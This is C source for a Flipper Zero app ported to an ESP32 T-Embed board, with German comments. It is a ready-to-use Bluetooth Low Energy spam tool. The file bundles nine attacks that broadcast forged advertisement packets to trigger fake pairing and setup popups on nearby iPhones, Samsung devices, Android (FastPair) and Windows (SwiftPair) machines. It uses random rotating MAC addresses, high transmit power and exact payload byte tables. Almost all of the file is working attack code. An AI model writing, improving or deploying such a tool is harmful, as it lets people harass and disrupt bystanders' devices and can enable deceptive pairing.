// ble_spam_custom - BLE Spam FAP fuer Sor3nt Flipper-Zero-ESP32-Port (T-Embed)
// Alle 9 Angriffe in einer App. Nutzt NUR firmware-exportierte APIs.
// Payloads 1:1 aus ble_spam_payloads.h / Bruce ble_spam.cpp.
// Braucht Custom-Firmware mit BLE-Spam-Fix fuer volle Power
// (connectable + rotierende MAC), laeuft auch auf Stock (schwaecher).
// KEIN Flashen noetig: .fap auf SD nach /ext/apps/Bluetooth/ kopieren.
#include <furi.h>
#include <furi_hal_bt.h>
#include <extra_beacon.h>
#include <furi_hal_random.h>
#include <gui/gui.h>
#include <gui/canvas.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/submenu.h>
#include <gui/modules/widget.h>
#include <gui/modules/text_input.h>
#include <input/input.h>
#include <FreeRTOS.h>
#include <task.h>
#include <string.h>
#include <stdio.h>

#define TAG "BleSpamCustom"
#define SPAM_THREAD_STACK 4096
#define DEV_LABEL_MAX 22
#define CUSTOM_NAME_MAX 24

typedef enum {
    AttackIphonePopup = 0,
    AttackIphoneAction,
    AttackIphoneNyd,
    AttackSamsungBuds,
    AttackSamsungWatch,
    AttackFastPair,
    AttackSwiftPair,
    AttackPairCustom,
    AttackAll,
    AttackCount,
} Attack;

typedef enum {
    ViewSubmenu = 0,
    ViewRunning,
    ViewTextInput,
} ViewId;

static const char* attack_titles[AttackCount] = {
    "Apple Device",
    "Apple Action",
    "Apple NYD",
    "Samsung Buds",
    "Samsung Watch",
    "FastPair",
    "SwiftPair",
    "Pair Spam",
    "ALL Mix",
};

static const char* attack_menu[AttackCount] = {
    "iPhone Popup",
    "iPhone Action",
    "iPhone NotYourDevice",
    "Samsung Buds",
    "Samsung Watch",
    "FastPair Android",
    "SwiftPair Windows",
    "Pair Custom",
    "ALL Mix",
};

/* ms pro Rotation / Rotationen pro Flut / Pause danach (ms) */
static const uint32_t attack_period_ms[AttackCount] = {
    200, 200, 200, 200, 200, 1000, 3000, 200, 200,
};
static const uint32_t attack_burst[AttackCount] = {
    20, 20, 20, 20, 20, 30, 10, 20, 20,
};
static const uint32_t attack_pause_ms[AttackCount] = {
    5000, 5000, 5000, 5000, 5000, 10000, 10000, 5000, 5000,
};

/* ---------- Payload-Tabellen (geklaut: ble_spam_payloads.h + Bruce) ---------- */

typedef struct {
    uint16_t id;
    const char* name;
} AppleDev;

static const AppleDev apple_devs[] = {
    {0x0E20, "AirPods Pro"}, {0x1420, "AirPods Pro 2"}, {0x2420, "AirPods Pro USB-C"},
    {0x2820, "AirPods 4 ANC"}, {0x2920, "AirPods 4"}, {0x2B20, "AirPods Max USB-C"},
    {0x2C20, "Powerbeats Pro 2"}, {0x0620, "Beats Solo 3"}, {0x0A20, "AirPods Max"},
    {0x1020, "Beats Flex"}, {0x0055, "AirTag"}, {0x0030, "Hermes AirTag"},
    {0x0220, "AirPods"}, {0x0F20, "AirPods 2"}, {0x1320, "AirPods 3"},
    {0x0320, "Powerbeats 3"}, {0x0B20, "Powerbeats Pro"}, {0x0C20, "Beats Solo Pro"},
    {0x1120, "Beats Studio Buds"}, {0x0520, "Beats X"}, {0x0920, "Beats Studio 3"},
    {0x1720, "Beats Studio Pro"}, {0x1220, "Beats Fit Pro"}, {0x1620, "Beats Studio Buds+"},
    {0x2520, "Beats Solo 4"}, {0x2620, "Beats Solo Buds"}, {0x2F20, "Powerbeats Fit"},
};
#define APPLE_DEV_COUNT (sizeof(apple_devs) / sizeof(apple_devs[0]))

typedef struct {
    uint8_t id;
    const char* name;
} AppleAct;

static const AppleAct apple_acts[] = {
    {0x13, "AppleTV AutoFill"}, {0x27, "AppleTV Connecting"}, {0x20, "Join This AppleTV?"},
    {0x19, "AppleTV Audio Sync"}, {0x1E, "AppleTV Color"}, {0x09, "Setup New iPhone"},
    {0x02, "Transfer Number"}, {0x0B, "HomePod Setup"}, {0x01, "Setup New AppleTV"},
    {0x06, "Pair AppleTV"}, {0x0D, "HomeKit Setup"}, {0x2B, "AppleID AppleTV?"},
    {0x05, "Apple Watch"}, {0x24, "Vision Pro"}, {0x2F, "Connect Device"},
    {0x21, "Software Update"}, {0x2E, "Unlock Watch"}, {0x25, "AirDrop Sidecar"},
    {0x2C, "Vision Pro Setup"},
};
#define APPLE_ACT_COUNT (sizeof(apple_acts) / sizeof(apple_acts[0]))

typedef struct {
    uint8_t r, g, b;
    const char* name;
} BudsColor;

static const BudsColor buds_cols[] = {
    {0xEE, 0x7A, 0x0C, "Fallback Buds"}, {0x9D, 0x17, 0x00, "Fallback Dots"},
    {0x39, 0xEA, 0x48, "Light Purple Buds2"}, {0xA7, 0xC6, 0x2C, "Bluish Silver Buds2"},
    {0x85, 0x01, 0x16, "Black Buds Live"}, {0x3D, 0x8F, 0x41, "Gray Black Buds2"},
    {0x3B, 0x6D, 0x02, "Bluish Chrome Buds2"}, {0xAE, 0x06, 0x3C, "Gray Beige Buds2"},
    {0xB8, 0xB9, 0x05, "Pure White Buds"}, {0xEA, 0xAA, 0x17, "Pure White Buds2"},
    {0xD3, 0x07, 0x04, "Black Buds"}, {0x9D, 0xB0, 0x06, "French Flag Buds"},
    {0x10, 0x1F, 0x1A, "Dark Purple Live"}, {0x85, 0x96, 0x08, "Dark Blue Buds"},
    {0x8E, 0x45, 0x03, "Pink Buds"}, {0x2C, 0x67, 0x40, "White Black Buds2"},
    {0x3F, 0x67, 0x18, "Bronze Buds Live"}, {0x42, 0xC5, 0x19, "Red Buds Live"},
    {0xAE, 0x07, 0x3A, "Black White Buds2"}, {0x01, 0x17, 0x16, "Sleek Black Buds2"},
    {0x12, 0x34, 0x56, "Ocean Blue Buds"}, {0x65, 0x43, 0x21, "Forest Green Buds"},
    {0x78, 0x9A, 0xBC, "Sunset Orange Buds"}, {0xDE, 0xF1, 0x23, "Midnight Black Buds"},
    {0x45, 0x67, 0x89, "Rose Gold Buds"}, {0xAB, 0xC1, 0x23, "Electric Yellow Buds"},
    {0x32, 0x16, 0x54, "Crimson Red Buds"}, {0x98, 0x76, 0x54, "Arctic White Buds"},
    {0x65, 0x49, 0x87, "Mystic Purple Buds"}, {0x32, 0x19, 0x87, "Golden Buds"},
};
#define BUDS_COUNT (sizeof(buds_cols) / sizeof(buds_cols[0]))

typedef struct {
    uint8_t id;
    const char* name;
} WatchModel;

static const WatchModel watch_models[] = {
    {0x1A, "Fallback Watch"}, {0x01, "White Watch4 Classic"}, {0x02, "Black Watch4 Classic"},
    {0x03, "White Watch4 40m"}, {0x04, "Black Watch4 44m"}, {0x05, "Silver Watch4 44m"},
    {0x06, "Green Watch4 44m"}, {0x07, "Black Watch4 40m"}, {0x08, "White Watch4 40m"},
    {0x09, "Gold Watch4 40m"}, {0x0A, "French Watch4"}, {0x0B, "French Watch4 Classic"},
    {0x0C, "Fox Watch5 44m"}, {0x11, "Black Watch5 44m"}, {0x12, "Sapphire Watch5 44m"},
    {0x13, "Purplish Watch5 40m"}, {0x14, "Gold Watch5 40m"}, {0x15, "Black Watch5 Pro"},
    {0x16, "Gray Watch5 Pro"}, {0x17, "White Watch5 44m"}, {0x18, "White Black Watch5"},
    {0x1B, "Black Watch6 Pink"}, {0x1C, "Gold Watch6 Gold"}, {0x1D, "Silver Watch6 Cyan"},
    {0x1E, "Black Watch6 Classic"}, {0x20, "Green Watch6 Classic"}, {0x21, "Midnight Black W6"},
    {0x22, "Ocean Blue W6"}, {0x23, "Rose Gold W6"}, {0x24, "Electric Yellow W6"},
    {0x25, "Crimson Red W6"}, {0x26, "Arctic White W6"}, {0x27, "Mystic Purple W6"},
    {0x28, "Golden W6"}, {0x29, "Forest Green W6"}, {0x2A, "Sunset Orange W6"},
    {0x30, "Black Galaxy Watch7"}, {0x31, "Green Galaxy Watch7"}, {0x32, "Cream Galaxy Watch7"},
    {0x33, "Green Watch7 40m"}, {0x34, "White Watch7 Classic"}, {0x35, "Black Watch7 Classic"},
    {0x40, "Titanium White Ultra"}, {0x41, "Titanium Black Ultra"}, {0x42, "Titanium Silver Ultra"},
    {0x60, "Black Galaxy Ring"}, {0x61, "Gold Galaxy Ring"}, {0x62, "Silver Galaxy Ring"},
};
#define WATCH_COUNT (sizeof(watch_models) / sizeof(watch_models[0]))

static const uint32_t fp_models[] = {
    0x0001F0, 0x000047, 0x470000, 0x00000A, 0x0A0000, 0x00000B, 0x0B0000, 0x00000D,
    0x000007, 0x070000, 0x000009, 0x090000, 0x000048, 0x001000, 0x00B727, 0x01E5CE,
    0x0200F0, 0x00F7D4, 0xF00002, 0xF00400, 0x1E89A7, 0x0577B1, 0x05A9BC, 0xCD8256,
    0x0000F0, 0xF00000, 0x821F66, 0xF52494, 0x718FA4, 0x0002F0, 0x92BBBD, 0x000006,
    0x060000, 0xD446A7, 0x2D7A23, 0x038B91, 0x02F637, 0x02D886, 0xF00001, 0xF00201,
    0xF00209, 0xF00205, 0xF00305, 0xF00E97, 0x04ACFC, 0x04AA91, 0x04AFB8, 0x05A963,
    0x05AA91, 0x05C452, 0x05C95C, 0x0602F0, 0x0603F0, 0x1E8B18, 0x1E955B, 0x06AE20,
    0x06C197, 0x06C95C, 0x06D8FC, 0x0744B6, 0x07A41C, 0x07C95C, 0x07F426, 0x0102F0,
    0x054B2D, 0x0660D7, 0x0103F0, 0x0903F0, 0x9ADB11, 0x8B66AB, 0xD99CA1, 0x77FF67,
    0xAA187F, 0xDCE9EA, 0x87B25F, 0x1448C9, 0x13B39D, 0x7C6CDB, 0x005EF9, 0xE2106F,
    0xB37A62, 0x92ADC9, 0x0E30C3, 0x72EF8D,
};
#define FP_COUNT (sizeof(fp_models) / sizeof(fp_models[0]))

static const char* swift_presets[] = {
    "Generic Swift Pair", "Never Gonna Give", "Bill Nye's iPhone", "Skibidi Toilet",
    "67", "FBI Van", "Surface Headphones", "Xbox Controller", "Surface Mouse",
};
#define SWIFT_PRESET_COUNT (sizeof(swift_presets) / sizeof(swift_presets[0]))

static const char* swift_phones[] = {
    "BT Headset", "Stereo HP", "Pro HP", "Ultra HP", "Bass HP", "Air HP",
    "Pulse HP", "Nova HP", "Echo HP", "Prime HP", "Core HP", "Sync HP",
};
#define SWIFT_PHONE_COUNT (sizeof(swift_phones) / sizeof(swift_phones[0]))

static const char swift_abc[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

/* ---------- App-State ---------- */

typedef struct {
    Gui* gui;
    ViewDispatcher* dispatcher;
    Submenu* submenu;
    Widget* widget;
    TextInput* text_input;
    FuriThread* thread;
    volatile bool running;
    Attack attack;
    int view;
    uint32_t ai, wi, fi, ni, slot;
    bool flip;
    uint32_t packets;
    bool need_bt;
    char dev[28];
    char pair_name[CUSTOM_NAME_MAX + 1];
} App;

/* ---------- Helfer ---------- */

static uint32_t rnd_u32(uint32_t n) {
    uint32_t v = 0;
    furi_hal_random_fill_buf(&v, sizeof(v));
    return n ? (v % n) : 0;
}

static void dev_set(App* app, const char* s) {
    snprintf(app->dev, sizeof(app->dev), "%.22s", s);
}

static void beacon_cfg_fresh(void) {
    uint8_t mac[EXTRA_BEACON_MAC_ADDR_SIZE];
    furi_hal_random_fill_buf(mac, sizeof(mac));
    GapExtraBeaconConfig cfg = {
        .min_adv_interval_ms = 20,
        .max_adv_interval_ms = 60,
        .adv_channel_map = GapAdvChannelMapAll,
        .adv_power_level = GapAdvPowerLevel_6dBm,
        .address_type = GapAddressTypeRandom,
    };
    memcpy(cfg.address, mac, sizeof(cfg.address));
    furi_hal_bt_extra_beacon_set_config(&cfg);
}

/* ---------- Payload-Builder (exakte Bytes aus ble_spam_payloads.h) ---------- */

static size_t build_apple_prox(uint8_t* b, uint16_t dev, bool not_yours, App* app, const char* name) {
    uint8_t i = 0;
    b[i++] = 0x1E;
    b[i++] = 0xFF;
    b[i++] = 0x4C;
    b[i++] = 0x00;
    b[i++] = 0x07;
    b[i++] = 0x19;
    b[i++] = not_yours ? 0x01 : 0x07;
    b[i++] = (uint8_t)(dev >> 8);
    b[i++] = (uint8_t)(dev & 0xFF);
    b[i++] = 0x55;
    furi_hal_random_fill_buf(&b[i], 3);
    i += 3;
    b[i++] = 0x00;
    b[i++] = 0x00;
    furi_hal_random_fill_buf(&b[i], 16);
    i += 16;
    dev_set(app, name);
    return i;
}

static size_t build_apple_action(uint8_t* b, App* app) {
    uint32_t k = rnd_u32(APPLE_ACT_COUNT);
    uint8_t id = apple_acts[k].id;
    uint8_t fl = 0xC0;
    if(id == 0x20 && rnd_u32(2) == 0) fl = 0xBF;
    if(id == 0x09 && rnd_u32(2) == 0) fl = 0x40;
    uint8_t i = 0;
    b[i++] = 0x02;
    b[i++] = 0x01;
    b[i++] = 0x06;
    b[i++] = 0x0A;
    b[i++] = 0xFF;
    b[i++] = 0x4C;
    b[i++] = 0x00;
    b[i++] = 0x0F;
    b[i++] = 0x05;
    b[i++] = fl;
    b[i++] = id;
    furi_hal_random_fill_buf(&b[i], 3);
    i += 3;
    dev_set(app, apple_acts[k].name);
    return i;
}

static size_t build_buds(uint8_t* b, App* app) {
    uint32_t k = rnd_u32(BUDS_COUNT);
    const BudsColor* c = &buds_cols[k];
    uint8_t i = 0;
    b[i++] = 0x1B;
    b[i++] = 0xFF;
    b[i++] = 0x75;
    b[i++] = 0x00;
    b[i++] = 0x42;
    b[i++] = 0x09;
    b[i++] = 0x81;
    b[i++] = 0x02;
    b[i++] = 0x14;
    b[i++] = 0x15;
    b[i++] = 0x03;
    b[i++] = 0x21;
    b[i++] = 0x01;
    b[i++] = 0x09;
    b[i++] = c->r;
    b[i++] = c->g;
    b[i++] = 0x01;
    b[i++] = c->b;
    b[i++] = 0x06;
    b[i++] = 0x3C;
    b[i++] = 0x94;
    b[i++] = 0x8E;
    b[i++] = 0x00;
    b[i++] = 0x00;
    b[i++] = 0x00;
    b[i++] = 0x00;
    b[i++] = 0xC7;
    b[i++] = 0x00;
    b[i++] = 0x10;
    b[i++] = 0xFF;
    b[i++] = 0x75;
    dev_set(app, c->name);
    return i;
}

static size_t build_watch(uint8_t* b, App* app) {
    uint32_t k = rnd_u32(WATCH_COUNT);
    uint8_t i = 0;
    b[i++] = 0x02;
    b[i++] = 0x01;
    b[i++] = 0x06;
    b[i++] = 0x0E;
    b[i++] = 0xFF;
    b[i++] = 0x75;
    b[i++] = 0x00;
    b[i++] = 0x01;
    b[i++] = 0x00;
    b[i++] = 0x02;
    b[i++] = 0x00;
    b[i++] = 0x01;
    b[i++] = 0x01;
    b[i++] = 0xFF;
    b[i++] = 0x00;
    b[i++] = 0x00;
    b[i++] = 0x43;
    b[i++] = watch_models[k].id;
    dev_set(app, watch_models[k].name);
    return i;
}

static size_t build_fastpair(uint8_t* b, App* app, uint32_t* idx) {
    uint32_t model;
    char hex[7];
    if(idx) {
        model = fp_models[(*idx) % FP_COUNT];
        (*idx)++;
        snprintf(hex, sizeof(hex), "FP");
    } else {
        model = fp_models[rnd_u32(FP_COUNT)];
        uint8_t h;
        const char* hd = "0123456789ABCDEF";
        hex[0] = hd[(model >> 20) & 0xF];
        hex[1] = hd[(model >> 16) & 0xF];
        hex[2] = hd[(model >> 12) & 0xF];
        hex[3] = hd[(model >> 8) & 0xF];
        hex[4] = hd[(model >> 4) & 0xF];
        hex[5] = hd[model & 0xF];
        hex[6] = 0;
        (void)h;
    }
    uint8_t tx = (uint8_t)(rnd_u32(120) - 100 + 256);
    uint8_t i = 0;
    b[i++] = 0x02;
    b[i++] = 0x01;
    b[i++] = 0x06;
    b[i++] = 0x03;
    b[i++] = 0x03;
    b[i++] = 0x2C;
    b[i++] = 0xFE;
    b[i++] = 0x06;
    b[i++] = 0x16;
    b[i++] = 0x2C;
    b[i++] = 0xFE;
    b[i++] = (uint8_t)((model >> 16) & 0xFF);
    b[i++] = (uint8_t)((model >> 8) & 0xFF);
    b[i++] = (uint8_t)(model & 0xFF);
    b[i++] = 0x02;
    b[i++] = 0x0A;
    b[i++] = tx;
    dev_set(app, hex);
    return i;
}

static void swift_pick_name(char* out, size_t outsz, bool headphone) {
    (void)headphone;
    uint32_t r = rnd_u32(2);
    if(r == 0) {
        snprintf(out, outsz, "%s", swift_presets[rnd_u32(SWIFT_PRESET_COUNT)]);
    } else {
        size_t len = 1 + rnd_u32(10);
        size_t j;
        for(j = 0; j < len && j + 1 < outsz; j++) {
            out[j] = swift_abc[rnd_u32(52)];
        }
        out[j] = 0;
    }
    out[outsz - 1] = 0;
}

static size_t build_swift(uint8_t* b, App* app, bool headphone) {
    char name[32];
    swift_pick_name(name, sizeof(name), headphone);
    size_t maxlen = headphone ? 12 : 21;
    size_t nl = strlen(name);
    if(nl > maxlen) {
        nl = maxlen;
        name[nl] = 0;
    }
    dev_set(app, name);
    uint8_t i = 0;
    size_t k;
    b[i++] = 0x02;
    b[i++] = 0x01;
    b[i++] = 0x06;
    if(!headphone) {
        b[i++] = (uint8_t)(nl + 6);
        b[i++] = 0xFF;
        b[i++] = 0x06;
        b[i++] = 0x00;
        b[i++] = 0x03;
        b[i++] = 0x00;
        b[i++] = 0x80;
    } else {
        b[i++] = (uint8_t)(nl + 15);
        b[i++] = 0xFF;
        b[i++] = 0x06;
        b[i++] = 0x00;
        b[i++] = 0x03;
        b[i++] = 0x01;
        b[i++] = 0x80;
        b[i++] = 0xD7;
        b[i++] = 0x2F;
        b[i++] = 0xD2;
        b[i++] = 0xF4;
        b[i++] = 0x61;
        b[i++] = 0xE4;
        b[i++] = 0x04;
        b[i++] = 0x04;
        b[i++] = 0x00;
    }
    for(k = 0; k < nl; k++) {
        uint8_t c = (uint8_t)name[k];
        b[i++] = (c > 127) ? 63 : c;
    }
    return i;
}

static size_t build_pairname(uint8_t* b, App* app, const char* s) {
    size_t nl = strlen(s);
    if(nl > CUSTOM_NAME_MAX) nl = CUSTOM_NAME_MAX;
    dev_set(app, s);
    uint8_t i = 0;
    size_t k;
    b[i++] = 0x02;
    b[i++] = 0x01;
    b[i++] = 0x06;
    b[i++] = (uint8_t)(nl + 1);
    b[i++] = 0x09;
    for(k = 0; k < nl; k++) {
        uint8_t c = (uint8_t)s[k];
        b[i++] = (c > 127) ? 63 : c;
    }
    return i;
}

/* ---------- Engine ---------- */

static bool rotate_once(App* app) {
    uint8_t buf[EXTRA_BEACON_MAX_DATA_SIZE];
    size_t len = 0;
    furi_hal_bt_extra_beacon_stop();
    vTaskDelay(pdMS_TO_TICKS(150));
    beacon_cfg_fresh();
    vTaskDelay(pdMS_TO_TICKS(150));
    switch(app->attack) {
    case AttackIphonePopup: {
        uint32_t k = rnd_u32(APPLE_DEV_COUNT);
        len = build_apple_prox(buf, apple_devs[k].id, false, app, apple_devs[k].name);
        break;
    }
    case AttackIphoneAction:
        len = build_apple_action(buf, app);
        break;
    case AttackIphoneNyd: {
        uint32_t k = rnd_u32(APPLE_DEV_COUNT);
        len = build_apple_prox(buf, apple_devs[k].id, true, app, apple_devs[k].name);
        break;
    }
    case AttackSamsungBuds:
        len = build_buds(buf, app);
        break;
    case AttackSamsungWatch:
        len = build_watch(buf, app);
        break;
    case AttackFastPair:
        len = build_fastpair(buf, app, NULL);
        break;
    case AttackSwiftPair:
        app->flip = !app->flip;
        len = build_swift(buf, app, app->flip);
        break;
    case AttackPairCustom:
        len = build_pairname(buf, app, app->pair_name);
        break;
    case AttackAll: {
        uint32_t slot = app->slot % 4;
        app->slot++;
        if(slot == 0) {
            uint32_t k = rnd_u32(6);
            static const uint16_t a_ids[6] = {0x0E20, 0x0220, 0x1320, 0x0055, 0x1420, 0x0A20};
            static const char* a_names[6] = {"AirPods Pro", "AirPods", "AirPods 3", "AirTag", "AirPods Pro 2", "AirPods Max"};
            len = build_apple_prox(buf, a_ids[k], false, app, a_names[k]);
        } else if(slot == 1) {
            len = build_watch(buf, app);
        } else if(slot == 2) {
            len = build_fastpair(buf, app, &app->fi);
        } else {
            len = build_swift(buf, app, false);
        }
        break;
    }
    default:
        break;
    }
    if(len == 0 || len > EXTRA_BEACON_MAX_DATA_SIZE) return false;
    furi_hal_bt_extra_beacon_set_data(buf, (uint8_t)len);
    bool ok = furi_hal_bt_extra_beacon_start();
    if(ok) app->packets++;
    return ok;
}

static int32_t spam_thread(void* context) {
    App* app = context;
    uint32_t done = 0;
    while(app->running) {
        rotate_once(app);
        done++;
        uint32_t burst = attack_burst[app->attack];
        uint32_t slice = 0;
        uint32_t budget = (done >= burst) ? attack_pause_ms[app->attack] :
                                            attack_period_ms[app->attack];
        if(done >= burst) done = 0;
        while(app->running && slice < budget) {
            vTaskDelay(pdMS_TO_TICKS(50));
            slice += 50;
        }
    }
    return 0;
}

/* ---------- UI ---------- */

static void draw_running(App* app) {
    char line2[32];
    char line3[32];
    if(app->need_bt) {
        snprintf(line2, sizeof(line2), "BT an? Lock-Menue");
        snprintf(line3, sizeof(line3), "Ads: %lu", (unsigned long)app->packets);
    } else {
        snprintf(line2, sizeof(line2), "Dev: %.22s", app->dev);
        snprintf(line3, sizeof(line3), "Ads: %lu", (unsigned long)app->packets);
    }
    widget_reset(app->widget);
    widget_add_string_element(app->widget, 2, 8, AlignLeft, AlignTop, FontPrimary, attack_titles[app->attack]);
    widget_add_string_element(app->widget, 2, 20, AlignLeft, AlignTop, FontSecondary, line2);
    widget_add_string_element(app->widget, 2, 30, AlignLeft, AlignTop, FontSecondary, line3);
    widget_add_button_element(app->widget, GuiButtonTypeCenter, app->running ? "Stop" : "Start", widget_button_cb, app);
}

static void widget_button_cb(GuiButtonType btn, InputType type, void* context) {
    App* app = context;
    if(btn != GuiButtonTypeCenter || type != InputTypeShort) return;
    if(app->running) {
        spam_stop(app);
    } else {
        spam_start(app);
    }
    draw_running(app);
}

static void spam_start(App* app) {
    if(furi_hal_bt_extra_beacon_is_active()) furi_hal_bt_extra_beacon_stop();
    app->packets = 0;
    app->need_bt = false;
    app->ai = app->wi = app->fi = app->ni = app->slot = 0;
    app->flip = false;
    snprintf(app->dev, sizeof(app->dev), "---");
    draw_running(app);
    if(!rotate_once(app)) {
        app->need_bt = true;
        draw_running(app);
        return;
    }
    draw_running(app);
    app->running = true;
    app->thread = furi_thread_alloc();
    furi_thread_set_name(app->thread, "BleSpamCustom");
    furi_thread_set_stack_size(app->thread, SPAM_THREAD_STACK);
    furi_thread_set_context(app->thread, app);
    furi_thread_set_callback(app->thread, spam_thread);
    furi_thread_start(app->thread);
}

static void spam_stop(App* app) {
    app->running = false;
    if(app->thread) {
        furi_thread_join(app->thread);
        furi_thread_free(app->thread);
        app->thread = NULL;
    }
    furi_hal_bt_extra_beacon_stop();
    draw_running(app);
}

static void show_running(App* app) {
    app->view = ViewRunning;
    view_dispatcher_switch_to_view(app->dispatcher, ViewRunning);
}

static void submenu_cb(void* context, uint32_t index) {
    App* app = context;
    if(index >= AttackCount) return;
    app->attack = (Attack)index;
    app->packets = 0;
    app->need_bt = false;
    snprintf(app->dev, sizeof(app->dev), "---");
    if(app->attack == AttackPairCustom) {
        app->view = ViewTextInput;
        view_dispatcher_switch_to_view(app->dispatcher, ViewTextInput);
    } else {
        show_running(app);
        draw_running(app);
        spam_start(app);
    }
}

static void text_cb(void* context) {
    App* app = context;
    show_running(app);
    draw_running(app);
    spam_start(app);
}

static bool nav_cb(void* context) {
    App* app = context;
    if(app->view == ViewRunning) {
        spam_stop(app);
        if(app->attack == AttackPairCustom) {
            app->view = ViewTextInput;
            view_dispatcher_switch_to_view(app->dispatcher, ViewTextInput);
        } else {
            app->view = ViewSubmenu;
            view_dispatcher_switch_to_view(app->dispatcher, ViewSubmenu);
        }
        return true;
    }
    view_dispatcher_stop(app->dispatcher);
    return true;
}

int32_t ble_spam_custom_app(void* p) {
    (void)p;
    App* app = malloc(sizeof(App));
    memset(app, 0, sizeof(App));
    snprintf(app->pair_name, sizeof(app->pair_name), "T-Embed Buds");
    snprintf(app->dev, sizeof(app->dev), "---");

    app->gui = furi_record_open(RECORD_GUI);
    app->dispatcher = view_dispatcher_alloc();
    view_dispatcher_set_event_callback_context(app->dispatcher, app);
    view_dispatcher_set_navigation_event_callback(app->dispatcher, nav_cb);
    view_dispatcher_attach_to_gui(app->dispatcher, app->gui, ViewDispatcherTypeFullscreen);

    app->submenu = submenu_alloc();
    submenu_set_header(app->submenu, "BLE Spam");
    for(uint32_t i = 0; i < AttackCount; i++) {
        submenu_add_item(app->submenu, attack_menu[i], i, submenu_cb, app);
    }
    view_dispatcher_add_view(app->dispatcher, ViewSubmenu, submenu_get_view(app->submenu));

    app->widget = widget_alloc();
    view_dispatcher_add_view(app->dispatcher, ViewRunning, widget_get_view(app->widget));

    app->text_input = text_input_alloc();
    text_input_set_header_text(app->text_input, "Pair name:");
    text_input_set_result_callback(
        app->text_input, text_cb, app, app->pair_name, sizeof(app->pair_name), true);
    view_dispatcher_add_view(app->dispatcher, ViewTextInput, text_input_get_view(app->text_input));

    app->view = ViewSubmenu;
    view_dispatcher_switch_to_view(app->dispatcher, ViewSubmenu);
    view_dispatcher_run(app->dispatcher);

    if(app->running) spam_stop(app);
    furi_hal_bt_extra_beacon_stop();
    view_dispatcher_remove_view(app->dispatcher, ViewSubmenu);
    view_dispatcher_remove_view(app->dispatcher, ViewRunning);
    view_dispatcher_remove_view(app->dispatcher, ViewTextInput);
    submenu_free(app->submenu);
    widget_free(app->widget);
    text_input_free(app->text_input);
    view_dispatcher_free(app->dispatcher);
    furi_record_close(RECORD_GUI);
    free(app);
    return 0;
}
